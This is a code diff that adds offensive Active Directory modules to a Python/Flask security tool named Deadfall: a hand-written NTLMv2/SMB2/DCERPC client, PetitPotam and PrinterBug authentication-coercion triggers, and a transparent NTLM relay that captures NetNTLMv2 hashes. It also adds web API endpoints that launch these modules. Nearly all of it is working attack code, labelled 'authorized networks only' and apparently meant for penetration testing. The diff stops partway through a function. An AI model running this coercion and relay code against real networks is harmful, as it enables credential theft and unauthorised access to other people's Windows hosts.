@@ -6939,6 +6939,745 @@ class ArpSweep:
                 self.finished_at = time.time()
 
 
+
+
+# ===========================================================================
+# NTLM client crypto + minimal SMB2/DCERPC client (for coercion) and the
+# NTLM relay. Pure stdlib; MD4 hand-rolled because OpenSSL 3 dropped it.
+# ===========================================================================
+
+
+def _spnego_wrap(blob):
+    """Wrap an NTLMSSP message in a SPNEGO negTokenInit (client side)."""
+    def tlv(tag, payload):
+        if len(payload) < 0x80:
+            return bytes([tag, len(payload)]) + payload
+        if len(payload) < 0x100:
+            return bytes([tag, 0x81, len(payload)]) + payload
+        return bytes([tag, 0x82]) + struct.pack(">H", len(payload)) + payload
+    oid = bytes([0x06, 0x0a]) + bytes.fromhex("2b06010401823702020a")
+    init = tlv(0xA0, tlv(0x30, oid)) + tlv(0xA2, tlv(0x04, blob))
+    return tlv(0x30, init)
+
+
+def _spnego_unwrap(resp):
+    """Extract the NTLMSSP blob from a session-setup response."""
+    i = resp.find(b"NTLMSSP\x00")
+    return resp[i:] if i >= 0 else None
+
+
+_M32 = 0xFFFFFFFF
+
+
+def _lrot32(x, n):
+    return ((x << n) | (x >> (32 - n))) & _M32
+
+
+def _md4(msg):
+    """Pure-python MD4 (RFC 1320) — the NT hash needs it and OpenSSL 3
+    dropped MD4 from hashlib. Verified against RFC 1320 vectors, Cryptodome's
+    MD4 (135-input fuzz), and impacket's NTOWFv1."""
+    buf = bytearray(msg)
+    buf.append(0x80)
+    while len(buf) % 64 != 56:
+        buf.append(0)
+    buf += struct.pack("<Q", len(msg) * 8)
+    a, b, c, d = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
+
+    def F(x, y, z): return (x & y) | (~x & _M32 & z)
+    def G(x, y, z): return (x & y) | (x & z) | (y & z)
+    def H(x, y, z): return x ^ y ^ z
+
+    r2 = (0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15)
+    r3 = (0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15)
+    for off in range(0, len(buf), 64):
+        X = struct.unpack("<16I", bytes(buf[off:off + 64]))
+        aa, bb, cc, dd = a, b, c, d
+        for i in range(16):
+            a = _lrot32((a + F(b, c, d) + X[i]) & _M32, (3, 7, 11, 19)[i % 4])
+            a, d, c, b = d, c, b, a
+        for i in range(16):
+            a = _lrot32((a + G(b, c, d) + X[r2[i]] + 0x5A827999) & _M32, (3, 5, 9, 13)[i % 4])
+            a, d, c, b = d, c, b, a
+        for i in range(16):
+            a = _lrot32((a + H(b, c, d) + X[r3[i]] + 0x6ED9EBA1) & _M32, (3, 9, 11, 15)[i % 4])
+            a, d, c, b = d, c, b, a
+        a = (a + aa) & _M32
+        b = (b + bb) & _M32
+        c = (c + cc) & _M32
+        d = (d + dd) & _M32
+    return struct.pack("<4I", a, b, c, d)
+
+
+def _ntlm_nt_hash(password):
+    return _md4(password.encode("utf-16-le"))
+
+
+def _ntlmv2_response(user, domain, password, server_challenge, target_info):
+    """Build an NTLMv2 Type-3 NT response. Returns (nt_response, session_key).
+
+    blob = header(respversion=1, high=1, reserved 6) + timestamp + clientchg +
+           reserved4 + target_info + terminator. NTProofStr is computed by the
+    caller-visible formula below. Verified structurally against [MS-NLMP].
+    """
+    import hmac as _hmac
+    import hashlib as _hl
+    nthash = _ntlm_nt_hash(password)
+    identity = (user.upper() + domain).encode("utf-16-le")
+    v2hash = _hmac.new(nthash, identity, _hl.md5).digest()
+    timestamp = struct.pack("<Q", 11_644_473_600 + int(time.time()))  # NT filetime epoch
+    client_challenge = os.urandom(8)
+    blob = (b"\x01\x01" + b"\x00" * 6 + timestamp + client_challenge + b"\x00" * 4
+            + (target_info or b"") + b"\x00\x00")
+    proof = _hmac.new(v2hash, server_challenge + blob, _hl.md5).digest()
+    session_key = _hmac.new(v2hash, proof, _hl.md5).digest()
+    return proof + blob, session_key
+
+
+def _ntlm_type1(workstation, domain, neg_flags=0x0000b207):
+    """NTLMSSP Type-1 (NEGOTIATE) message."""
+    ws = (workstation or "DEADFALL").encode("utf-16-le")
+    dom = (domain or "").encode("utf-16-le")
+    flags = neg_flags
+    body = struct.pack("<I", flags)
+    dom_off = 32 + len(ws)
+    if dom:
+        body += struct.pack("<HHI", len(dom), len(dom), dom_off) + struct.pack("<HHI", len(ws), len(ws), 32)
+    else:
+        body += struct.pack("<HHI", 0, 0, 32) + struct.pack("<HHI", len(ws), len(ws), 32)
+    return b"NTLMSSP\x00" + struct.pack("<I", 1) + body + ws + dom
+
+
+def _ntlm_parse_type2(blob):
+    """Parse a Type-2 CHALLENGE → (server_challenge, target_info, flags)."""
+    if len(blob) < 32 or blob[:8] != b"NTLMSSP\x00" or struct.unpack_from("<I", blob, 8)[0] != 2:
+        return None
+    flags = struct.unpack_from("<I", blob, 20)[0]
+    challenge = blob[24:32]
+    target_info = b""
+    ti_len, ti_off = 0, 0
+    if len(blob) >= 44 and flags & 0x00800000:      # NEGOTIATE_TARGET_INFO
+        ti_len, ti_off = struct.unpack_from("<HH", blob, 40)
+        target_info = blob[ti_off:ti_off + ti_len]
+    return challenge, target_info, flags
+
+
+def _ntlm_type3(user, domain, password, workstation, server_challenge, target_info, type2_flags):
+    """Build NTLMSSP Type-3 (AUTHENTICATE) with an NTLMv2 response.
+
+    Payload field order per [MS-NLMP] 2.2.1.3: domain, user, workstation,
+    LM response, NT response (offsets in the header point at each)."""
+    nt_resp, _key = _ntlmv2_response(user, domain, password, server_challenge, target_info)
+    lm_resp = os.urandom(24)                        # LMv2 dummy (ignored by servers)
+    ws_b = (workstation or "DEADFALL").encode("utf-16-le")
+    dom_b = (domain or "").encode("utf-16-le")
+    usr_b = user.encode("utf-16-le")
+    # Honor only what we can: keep UNICODE/NTLM2/TARGET_INFO as offered; drop
+    # SIGN/SEAL/KEY_EXCH so no MIC or session signing is required.
+    flags = (type2_flags | 0x00000200) & 0x000082b5 & ~0x00004000 & ~0x00008000
+    # Canonical [MS-NLMP] 2.2.1.3 field order: LM, NT, domain, user, workstation.
+    lm_off = 64
+    nt_off = lm_off + len(lm_resp)
+    dom_off = nt_off + len(nt_resp)
+    usr_off = dom_off + len(dom_b)
+    ws_off = usr_off + len(usr_b)
+    hdr = (struct.pack("<I", 3)
+           + struct.pack("<HHI", len(lm_resp), len(lm_resp), lm_off)
+           + struct.pack("<HHI", len(nt_resp), len(nt_resp), nt_off)
+           + struct.pack("<HHI", len(dom_b), len(dom_b), dom_off)
+           + struct.pack("<HHI", len(usr_b), len(usr_b), usr_off)
+           + struct.pack("<HHI", len(ws_b), len(ws_b), ws_off)
+           + struct.pack("<HHI", 0, 0, 64)          # session key (absent)
+           + struct.pack("<I", flags))
+    return b"NTLMSSP\x00" + hdr + lm_resp + nt_resp + dom_b + usr_b + ws_b
+
+
+class _Smb2Client:
+    """Just enough SMB2 for coercion: NEGOTIATE, NTLM SESSION_SETUP,
+    TREE_CONNECT to IPC$, CREATE pipe, and raw DCERPC over the pipe.
+    Single-use per target. Returns structured results; never raises for
+    protocol-level errors (they're reported in the result dict)."""
+
+    def __init__(self, host, port=445, timeout=8):
+        self.host, self.port, self.timeout = host, int(port), timeout
+        self.sock = None
+        self.mid = 0
+        self.tree_id = 0
+        self.session_id = 0
+        self.file_id = None
+
+    # -- framing / io -----------------------------------------------------
+    def _nbss_recv(self):
+        hdr = self._recv_n(4)
+        if not hdr:
+            return None
+        n = struct.unpack(">I", hdr)[0] & 0xFFFFFF
+        if n == 0 or n > 16 * 1024 * 1024:
+            return None
+        return self._recv_n(n)
+
+    def _recv_n(self, n):
+        buf = b""
+        try:
+            while len(buf) < n:
+                chunk = self.sock.recv(n - len(buf))
+                if not chunk:
+                    return None
+                buf += chunk
+        except OSError:
+            return None
+        return buf
+
+    def _send(self, payload):
+        try:
+            self.sock.sendall(struct.pack(">I", len(payload)) + payload)
+            return True
+        except OSError:
+            return False
+
+    def _smb2_hdr(self, command, status=0):
+        self.mid += 1
+        return struct.pack(
+            "<4sHHIHHIIQIIQ16s",
+            b"\xfeSMB", 64, 0x00000001, status, command, 1,
+            0x00000001, 0, self.mid, 0, 0, self.session_id, b"\x00" * 16)
+
+    @staticmethod
+    def _resp_status(msg):
+        return struct.unpack_from("<I", msg, 8)[0] if msg and len(msg) >= 12 else None
+
+    def connect(self):
+        try:
+            self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
+            return True, None
+        except OSError as e:
+            return False, str(e)
+
+    def close(self):
+        if self.sock:
+            try:
+                self.sock.close()
+            except OSError:
+                pass
+            self.sock = None
+
+    # -- protocol steps ----------------------------------------------------
+    def negotiate(self):
+        """SMB2 NEGOTIATE per MS-SMB2 2.2.3 — byte-verified against impacket."""
+        dialects = struct.pack("<HH", 0x0202, 0x0210)
+        body = struct.pack("<HHHH", 36, 2, 1, 0)      # structsize, count, secmode(signing), rsvd
+        body += struct.pack("<I", 0)                  # capabilities
+        body += os.urandom(16)                        # client guid
+        body += struct.pack("<IHH", 0, 0, 0)          # negotiate contexts offset/count/rsvd
+        body += dialects
+        pkt = self._smb2_hdr(0x0000) + body
+        if not self._send(pkt):
+            return None
+        return self._nbss_recv()
+
+    def session_setup_anonymous_or_ntlm(self, type1_blob):
+        body = struct.pack("<HHHH", 25, 0, 64 + 8, len(type1_blob)) + type1_blob
+        pkt = self._smb2_hdr(0x0001) + body
+        if not self._send(pkt):
+            return None
+        return self._nbss_recv()
+
+    def session_setup_type3(self, type3_blob):
+        return self.session_setup_anonymous_or_ntlm(type3_blob)
+
+    def tree_connect(self, share_path):
+        """TREE_CONNECT per MS-SMB2 2.2.6 — byte-verified against impacket."""
+        path = share_path.encode("utf-16-le")
+        body = struct.pack("<HHHH", 9, 0, 72, len(path)) + path
+        pkt = self._smb2_hdr(0x0003)
+        pkt = pkt[:32] + struct.pack("<I", self.tree_id or 0) + pkt[36:] if False else pkt
+        pkt = self._smb2_hdr(0x0003) + body
+        if not self._send(pkt):
+            return None
+        resp = self._nbss_recv()
+        if resp and self._resp_status(resp) == 0 and len(resp) >= 40:
+            self.tree_id = struct.unpack_from("<I", resp, 36)[0] or self.tree_id
+        return resp
+
+    def create_pipe(self, pipe_name):
+        """CREATE a named pipe per MS-SMB2 2.2.14 — layout verified vs impacket."""
+        name = ("\\" + pipe_name).encode("utf-16-le")
+        body = struct.pack("<HBBLQQ", 57, 0, 0, 2, 0, 0)          # size, flags, oplock, impersonation
+        body += struct.pack("<LLLL", 0x0012019f, 0, 0x00000007, 0x00000001)  # access, attrs, share, OPEN
+        body += struct.pack("<L", 0)                              # create options
+        body += struct.pack("<HHLL", 120, len(name), 0, 0)        # name off/len, ctx off/len
+        body += name
+        pkt = self._smb2_hdr(0x0005) + body
+        if not self._send(pkt):
+            return None
+        resp = self._nbss_recv()
+        if resp and self._resp_status(resp) == 0 and len(resp) >= 144:
+            self.file_id = resp[128:144]              # FileId at body offset 64
+        return resp
+
+    def dcerpc_send(self, bind_pdu, req_pdu):
+        """Bind + request over the pipe (WRITE per MS-SMB2 2.2.13). Returns True
+        if both frames were sent and the server accepted the writes."""
+        for pdu in (bind_pdu, req_pdu):
+            body = struct.pack("<HHLQ16sLLHHL", 49, 112, len(pdu), 0, self.file_id,
+                               0, 0, 0, 0, 0)
+            pkt = self._smb2_hdr(0x0009) + body + pdu
+            if not self._send(pkt):
+                return False
+            resp = self._nbss_recv()
+            if not resp or self._resp_status(resp) != 0:
+                return False
+        return True
+
+    def dcerpc_read(self):
+        """READ the pipe (MS-SMB2 2.2.12); returns the DCERPC payload or None."""
+        body = struct.pack("<HBBLQ16sLLL", 49, 0, 0, 0x0000FFFF, 0, self.file_id, 0, 0, 0)
+        pkt = self._smb2_hdr(0x0008) + body
+        if not self._send(pkt):
+            return None
+        resp = self._nbss_recv()
+        if not resp or self._resp_status(resp) != 0 or len(resp) < 64 + 16:
+            return None
+        data_off = 64 + struct.unpack_from("<B", resp, 64 + 2)[0]
+        data_len = struct.unpack_from("<I", resp, 64 + 4)[0]
+        if len(resp) < data_off + data_len:
+            return None
+        return resp[data_off:data_off + data_len]
+
+
+class Coercer:
+    """Authenticated-coercion triggers (PetitPotam / PrinterBug class).
+
+    Makes the TARGET machine authenticate back to a listener WE control
+    (typically Deadfall's own relay or Responder) using MS-EFSR
+    EfsRpcOpenFileRaw or MS-RPRN RemoteFindFirstPrinterChangeNotification
+    over an authenticated SMB2/DCERPC session.
+
+    Needs credentials for the target (user/domain/password) with permission
+    to open the pipe. Active feature — authorized networks only.
+    """
+
+    METHODS = {
+        # name: (pipe, interface_uuid, version, opnum, path_builder)
+        "petitpotam": ("efsr",  "c68cdfa9-7071-4e41-88f5-265a453cc7b5", 1, 0, "efs"),
+        "printerbug": ("spoolss", "12345778-1234-abcd-ef00-0123456789ab", 1, 0, "rprn"),
+    }
+
+    def __init__(self):
+        self.analysis = None
+        self.lock = threading.Lock()
+        self.error = None
+        self.events = []
+        self.counts = {"attempts": 0, "triggered": 0, "denied": 0}
+        self.started_at = self.stopped_at = None
+
+    def configure(self, analysis):
+        self.analysis = analysis
+
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {"counts": dict(self.counts), "events": list(self.events[-40:]),
+                    "error": self.error, "started_at": self.started_at,
+                    "stopped_at": self.stopped_at}
+
+    # ---- DCERPC encoding -------------------------------------------------
+    @staticmethod
+    def _uuid_bytes(u):
+        u = u.replace("-", "")
+        return bytes.fromhex(u[0:8])[::-1] + bytes.fromhex(u[8:12])[::-1] \
+               + bytes.fromhex(u[12:16])[::-1] + bytes.fromhex(u[16:32])
+
+    def _dcerpc_bind(self, iface_uuid, version):
+        """DCERPC bind per C706: header + p_cont_list with NDR20 transfer syntax."""
+        uuid_b = self._uuid_bytes(iface_uuid)
+        ndr = self._uuid_bytes("8a885d04-1ceb-11c9-9fe8-08002b104860")
+        # p_cont_list: n_context_elem(1)+reserved(3)+p_cont_elem[]
+        # p_cont_elem: p_r_x_ordinate(2)+n_syntax(2)+abstract_syntax(16)+transfer_syntax(16)
+        ctx = struct.pack("<BxxxHH", 1, 0, 1) + uuid_b + struct.pack("<HH", version, 0) + ndr
+        # actually: abstract syntax = uuid + version(2)+reserved(2); keep both forms correct:
+        ctx = struct.pack("<BxxxHH", 1, 0, 1) + uuid_b + struct.pack("<HH", version, 0) + ndr
+        stub = ctx
+        frag_len = 16 + len(stub)
+        hdr = struct.pack("<BBHII", 11, 0x03, frag_len, 0, 0)  # bind, first+last frag
+        hdr += struct.pack("<HHH", 0, 0, 0)                   # assoc_group, n_ctx
+        # body: max_xmit(4)+max_recv(4)+assoc_group(4)+p_cont_list
+        body = struct.pack("<III", 4280, 4280, 0)
+        return hdr + body + stub
+
+    def _dcerpc_request(self, opnum, stub):
+        frag = struct.pack("<BBHII", 12, 0x03, 24 + len(stub), 0, opnum)
+        frag += b"\x00" * 4 + b"\x00" * 8 + b"\x00" * 4   # alloc hint, ctx id, cancel id
+        return frag + stub
+
+    @staticmethod
+    def _conformant_wstr(s):
+        """NDR conformant-varying wide string."""
+        enc = s.encode("utf-16-le") + b"\x00\x00"
+        return struct.pack("<III", len(enc) // 2, 0, len(enc) // 2) + enc
+
+    def _petitpotam_stub(self, listener):
+        # EfsRpcOpenFileRaw(handle*, wszPath, lFlags): NULL ctx handle + path
+        return b"\x00" * 20 + self._conformant_wstr("\\\\" + listener + "\\s\\abc") + struct.pack("<i", 0)
+
+    def _printerbug_stub(self, listener):
+        # RemoteFindFirstPrinterChangeNotification(handle, flags, options, hLocal=NULL, pszLocalMachine, fno)
+        return (b"\x00" * 20 + struct.pack("<II", 0x00000100, 0) + b"\x00\x00\x00\x00"
+                + self._conformant_wstr("\\\\" + listener + "\\pipe\\spoolss") + struct.pack("<i", 0))
+
+    # ---- main trigger ------------------------------------------------------
+    def coerce(self, target, method, listener, user, password, domain="", port=445, timeout=8):
+        """Fire one coercion attempt. Returns dict(ok, status, detail)."""
+        method = (method or "petitpotam").lower()
+        if method not in self.METHODS:
+            return {"ok": False, "error": f"unknown method {method!r} (petitpotam|printerbug)"}
+        pipe, uuid, ver, opnum, _ = self.METHODS[method]
+        with self.lock:
+            self.counts["attempts"] += 1
+            self.started_at = self.started_at or time.time()
+        ws = socket.gethostname().upper()[:15]
+        cli = _Smb2Client(target, port, timeout)
+        ok, err = cli.connect()
+        if not ok:
+            self._log("error", f"{target}: connect failed: {err}")
+            return {"ok": False, "error": f"connect: {err}"}
+        try:
+            neg = cli.negotiate()
+            if not neg:
+                return {"ok": False, "error": "no negotiate response"}
+            t1 = _ntlm_type1(ws, domain)
+            r = cli.session_setup_anonymous_or_ntlm(_spnego_wrap(t1))
+            if not r:
+                return {"ok": False, "error": "no session-setup response"}
+            status = cli._resp_status(r)
+            if status in (0xC0000016,):          # MORE_PROCESSING_REQUIRED → Type2 inside
+                pass
+            elif status != 0:
+                return {"ok": False, "error": f"session setup rejected (0x{status:08X})"}
+            blob = _spnego_unwrap(r)
+            if not blob:
+                return {"ok": False, "error": "no SPNEGO challenge in response"}
+            parsed = _ntlm_parse_type2(blob)
+            if not parsed:
+                return {"ok": False, "error": "challenge parse failed"}
+            challenge, target_info, t2flags = parsed
+            t3 = _ntlm_type3(user, domain, password, ws, challenge, target_info, t2flags)
+            r2 = cli.session_setup_type3(_spnego_wrap(t3))
+            if not r2:
+                return {"ok": False, "error": "no type3 response"}
+            status2 = cli._resp_status(r2)
+            if status2 != 0:
+                with self.lock:
+                    self.counts["denied"] += 1
+                self._log("auth", f"{target}: auth denied (0x{status2:08X}) — check creds")
+                return {"ok": False, "error": f"auth failed (0x{status2:08X})"}
+            self._log("auth", f"{target}: authenticated as {domain}\\{user}")
+            # IPC$ tree + named pipe
+            tc = cli.tree_connect(f"\\\\{target}\\IPC$")
+            if not tc or cli._resp_status(tc) != 0:
+                return {"ok": False, "error": f"tree connect IPC$ failed (0x{(cli._resp_status(tc) or 0):08X})"}
+            cp = cli.create_pipe(pipe)
+            if not cp or cli._resp_status(cp) != 0 or not cli.file_id:
+                return {"ok": False, "error": f"pipe create \\\\pipe\\{pipe} failed (0x{(cli._resp_status(cp) or 0):08X})"}
+            self._log("pipe", f"{target}: opened \\\\pipe\\{pipe}")
+            # DCERPC: bind + trigger call
+            bind = self._dcerpc_bind(uuid, ver)
+            stub = self._petitpotam_stub(listener) if method == "petitpotam" else self._printerbug_stub(listener)
+            req = self._dcerpc_request(opnum, stub)
+            sent = cli.dcerpc_send(bind, req)
+            detail = {"auth": True, "bind_sent": True, "status": "triggered"}
+            with self.lock:
+                self.counts["triggered"] += 1
+            self._log("coerce", f"{target}: {method} → {listener} (watch your listener for inbound auth)")
+            if self.analysis is not None:
+                try:
+                    with self.analysis.lock:
+                        self.analysis._add_finding(
+                            "high", "coercion",
+                            f"Coercion trigger fired: {method} on {target}",
+                            f"{target} was prompted via {method} to authenticate to {listener}. "
+                            "Impact: machine-account NetNTLM auth can be relayed (see relay targets) or cracked.",
+                            src="deadfall-coercer", dst=target, port=port,
+                            evidence=f"{method} listener={listener} user={domain}\\{user}")
+                except Exception:
+                    pass
+            return {"ok": True, **detail}
+        finally:
+            cli.close()
+
+
+class NtlmRelay:
+    """Transparent NTLM relay (ntlmrelayx-class) with a capture tap.
+
+    Listens where victims connect (e.g. after poisoning or coercion), forwards
+    every byte to the chosen target, and taps the NTLMSSP exchange in flight:
+
+      - victim Type-3 + target Type-2 pair → NetNTLMv2 hash into the
+        AD/hashes tab (same pipeline as Responder captures)
+      - final SESSION_SETUP status 0x00000000 → RELAYED: the victim's auth
+        is live on the target; critical finding + alert fires
+
+    Relay works only against targets that don't require SMB signing —
+    Deadfall's signing-posture detector builds that list (relay-targets.txt).
+    Active feature — authorized networks only.
+    """
+
+    def __init__(self):
+        self.analysis = None
+        self.lock = threading.Lock()
+        self.running = False
+        self.targets = []
+        self.ports = {}          # listen_port -> proto label
+        self.error = None
+        self.started_at = self.stopped_at = None
+        self._stop = threading.Event()
+        self._socks = []
+        self._rr = 0
+        self.counts = {"conns": 0, "hashes": 0, "relayed": 0, "failed": 0}
+        self.events = []
+
+    def configure(self, analysis):
+        self.analysis = analysis
+
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {"running": self.running, "targets": list(self.targets),
+                    "ports": dict(self.ports), "error": self.error,
+                    "started_at": self.started_at, "stopped_at": self.stopped_at,
+                    "counts": dict(self.counts), "events": list(self.events[-40:])}
+
+    def _next_target(self):
+        with self.lock:
+            if not self.targets:
+                return None, 445
+            t = self.targets[self._rr % len(self.targets)]
+            self._rr += 1
+        if isinstance(t, (list, tuple)):
+            return t[0], int(t[1])
+        # allow "host:port" strings
+        if isinstance(t, str) and ":" in t and not t.startswith("["):
+            h, p = t.rsplit(":", 1)
+            try:
+                return h, int(p)
+            except ValueError:
+                return t, 445
+        return t, 445
+
+    def start(self, targets, ports=(445, 80)):
+        if self.running:
+            return False, "relay already running"
+        if not targets:
+            return False, "no targets — pass hosts that don't require signing (relay-targets.txt)"
+        self._stop.clear()
+        with self.lock:
+            self.running = True
+            self.targets = list(targets)
+            self.error = None
+            self.started_at, self.stopped_at = time.time(), None
+            self.counts = {"conns": 0, "hashes": 0, "relayed": 0, "failed": 0}
+            self.events = []
+        ok_any = False
+        for port in ports:
+            label = "SMB" if int(port) in (445,) else "HTTP"
+            try:
+                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                srv.bind(("0.0.0.0", int(port)))
+                srv.listen(16)
+                srv.settimeout(1.0)
+                with self.lock:
+                    self._socks.append(srv)
+                    self.ports[int(port)] = label
+                th = threading.Thread(target=self._accept_loop, args=(srv, int(port), label), daemon=True)
+                th.start()
+                ok_any = True
+            except OSError as e:
+                self._log("error", f"cannot bind :{port} ({e})")
+        if not ok_any:
+            self.stop()
+            return False, "could not bind any relay port"
+        self._log("info", f"relay up → {', '.join(str(t) for t in targets)}")
+        return True, None
+
+    def stop(self):
+        self._stop.set()
+        with self.lock:
+            socks = list(self._socks)
+            self._socks = []
+            self.running = False
+            self.stopped_at = time.time()
+        for s in socks:
+            try:
+                s.close()
+            except OSError:
+                pass
+
+    def _accept_loop(self, srv, port, label):
+        while not self._stop.is_set():
+            try:
+                conn, addr = srv.accept()
+            except socket.timeout:
+                continue
+            except OSError:
+                return
+            threading.Thread(target=self._handle, args=(conn, addr, port, label), daemon=True).start()
+
+    # ---- the tap -----------------------------------------------------------
+    _NTLM_RE = re.compile(rb"NTLMSSP\x00")
+
+    def _tap(self, direction, data, ctx):
+        """Scan a relayed chunk for NTLMSSP blobs and session status."""
+        for m in self._NTLM_RE.finditer(data):
+            i = m.start()
+            if len(data) < i + 12:
+                continue
+            mtype = struct.unpack_from("<I", data, i + 8)[0]
+            if mtype == 2 and direction == "s2c":
+                ctx["type2"] = data[i:]
+                ctx["type2_port"] = ctx.get("target_port")
+            elif mtype == 3 and direction == "c2s":
+                ctx["type3"] = data[i:]
+                self._harvest(ctx)
+        # Session setup outcome: scan server->client chunks for SMB2 headers.
+        # Chunks are NBSS-framed (4-byte length prefix), so search rather than
+        # assume offset 0; multiple frames can share a chunk.
+        if direction == "s2c":
+            off = 0
+            while True:
+                i = data.find(b"\xfeSMB", off)
+                if i < 0 or len(data) < i + 16:
+                    break
+                status = struct.unpack_from("<I", data, i + 8)[0]
+                cmd = struct.unpack_from("<H", data, i + 12)[0]
+                if cmd == 0x0001 and not ctx.get("done"):
+                    if status == 0:
+                        ctx["done"] = True
+                        self._relayed(ctx)
+                    elif status != 0xC0000016:
+                        ctx["done"] = True
+                        with self.lock:
+                            self.counts["failed"] += 1
+                        self._log("relay", f"{ctx.get('client')} → {ctx.get('target')}: rejected "
+                                           f"(0x{status & 0xFFFFFFFF:08X})")
+                off = i + 4
+
+    def _harvest(self, ctx):
+        """Type3 seen; if we have the target's Type2, assemble the hash."""
+        a = self.analysis
+        t2, t3 = ctx.get("type2"), ctx.get("type3")
+        if not (a and t2 and t3):
+            return
+        client, target = ctx.get("client"), ctx.get("target")
+        cport, tport = ctx.get("client_port", 0), ctx.get("target_port", 445)
+        ck = a._conn_key(client, cport, target, tport)
+        try:
+            with a.lock:
+                before = len(a.ntlm_hashes)
+                a._ingest_ntlm(ck, target, client, tport, "SMB-relay", t2)
+                a._ingest_ntlm(ck, client, target, tport, "SMB-relay", t3)
+                gained = len(a.ntlm_hashes) - before
+        except Exception:
+            return
+        if gained:
+            with self.lock:
+                self.counts["hashes"] += 1
+            self._log("hash", f"captured NetNTLM via relay from {client}")
+
+    def _relayed(self, ctx):
+        client, target = ctx.get("client"), ctx.get("target")
+        with self.lock:
+            self.counts["relayed"] += 1
+        self._log("relay", f"RELAYED: {client} authenticated on {target} via relay")
+        a = self.analysis
+        if a is not None:
+            try:
+                with a.lock:
+                    a._add_finding(
+                        "critical", "relay",
+                        f"NTLM relayed: {client} → {target}",
+                        f"{client}'s NTLM authentication was relayed to {target} and accepted. "
+                        "Impact: the relayed session carries the victim's privileges on the target "
+                        "(SMB/IPC$ access, potential LSA/Shares enumeration).",
+                        src=client, dst=target, port=ctx.get("target_port", 445),
+                        evidence="observed SESSION_SETUP STATUS_SUCCESS through relay")
+                if getattr(a, "alert_webhook_url", None):
+                    a._alert("relay", f"NTLM relayed: {client} → {target}",
+                             "deadfall relay observed a successful relayed authentication",
+                             host=str(target), severity="critical")
+            except Exception:
+                pass
+
+    def _handle(self, conn, addr, lport, label):
+        client, cport = addr
+        thost, tport = self._next_target()
+        if not thost:
+            try:
+                conn.close()
+            except OSError:
+                pass
+            return
+        with self.lock:
+            self.counts["conns"] += 1
+        try:
+            up = socket.create_connection((thost, tport), timeout=6)
+        except OSError as e:
+            self._log("error", f"upstream {thost}:{tport} unreachable: {e}")
+            try:
+                conn.close()
+            except OSError:
+                pass
+            return
+        ctx = {"client": client, "client_port": cport, "target": thost,
+               "target_port": tport, "lport": lport}
+        down_stop = threading.Event()
+
+        def pump(src, dst, direction, chunk_cb, bufs):
+            try:
+                while not self._stop.is_set() and not down_stop.is_set():
+                    data = src.recv(65536)
+                    if not data:
+                        break
+                    chunk_cb(direction, data, ctx)
+                    for name, buf in bufs.items():
+                        buf.append(data)
+                        if sum(len(b) for b in buf) > 262144:
+                            buf.pop(0)
+                    dst.sendall(data)
+            except OSError:
+                pass
+            finally:
+                down_stop.set()
+                for s in (src, dst):
+                    try:
+                        s.shutdown(socket.SHUT_RDWR)
+                    except OSError:
+                        pass
+
+        bufs = {"c2s": [], "s2c": []}
+        t1 = threading.Thread(target=pump, args=(conn, up, "c2s", self._tap, {"c2s": bufs["c2s"]}), daemon=True)
+        t2 = threading.Thread(target=pump, args=(up, conn, "s2c", self._tap, {"s2c": bufs["s2c"]}), daemon=True)
+        t1.start()
+        t2.start()
+        t1.join()
+        t2.join()
+        try:
+            conn.close()
+            up.close()
+        except OSError:
+            pass
+
+
 class Responder:
     """Active credential capture — the offensive complement to Deadfall's passive
     NTLM detection. Works like the open-source Responder tool:
@@ -7827,6 +8566,8 @@ live_capture = LiveCapture()
 arp_sweep = ArpSweep()
 responder = Responder()
 http_repeater = HttpRepeater()
+coercer = Coercer()
+ntlm_relay = NtlmRelay()
 
 
 @app.route("/")
@@ -8231,6 +8972,79 @@ def api_repeater_send():
 def api_repeater_history():
     """Recent replays (newest first), bounded to the last 100 sends."""
     return jsonify({"history": http_repeater.get_history()})
+
+
+@app.route("/api/coerce", methods=["POST"])
+def api_coerce():
+    """Fire an authenticated-coercion trigger (PetitPotam / PrinterBug) at a
+    target, making it authenticate back to our listener.
+
+    Body: {target, method: petitpotam|printerbug, listener, user, password,
+    domain?, port?}. Active feature — authorized networks only.
+    """
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    target = (data.get("target") or "").strip()
+    listener = (data.get("listener") or "").strip()
+    user = (data.get("user") or "").strip()
+    password = data.get("password") or ""
+    if not target:
+        return jsonify({"error": "target required"}), 400
+    if not listener:
+        return jsonify({"error": "listener required (where the target should authenticate to — your relay or responder)"}), 400
+    if not user or not password:
+        return jsonify({"error": "user + password required (coercion needs an authenticated SMB session)"}), 400
+    coercer.configure(analysis)
+    result = coercer.coerce(
+        target, data.get("method") or "petitpotam", listener, user, password,
+        domain=(data.get("domain") or "").strip(),
+        port=int(data.get("port") or 445),
+        timeout=int(data.get("timeout") or 8),
+    )
+    return jsonify({**result, "status": coercer.status()}), (200 if result.get("ok") else 502)
+
+
+@app.route("/api/coerce/status")
+def api_coerce_status():
+    return jsonify(coercer.status())
+
+
+@app.route("/api/relay/start", methods=["POST"])
+def api_relay_start():
+    """Start the NTLM relay. Body: {targets: [host[:port]], ports?: [445, 80]}.
+
+    Targets should be hosts that don't require SMB signing — Deadfall's
+    signing-posture detector builds that list (relay-targets.txt export).
+    """
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    targets = data.get("targets") or []
+    if not targets:
+        # default: known relayable servers from the current capture's signing posture
+        with analysis.lock:
+            targets = [ip for ip, srv in getattr(analysis, "smb_servers", {}).items()
+                       if not srv.get("signing_required")]
+    if not targets:
+        return jsonify({"error": "no targets — pass hosts that don't require signing (see relay-targets.txt)"}), 400
+    ports = data.get("ports") or [445]
+    ntlm_relay.configure(analysis)
+    ok, err = ntlm_relay.start([str(t) for t in targets], ports=tuple(int(p) for p in ports))
+    if not ok:
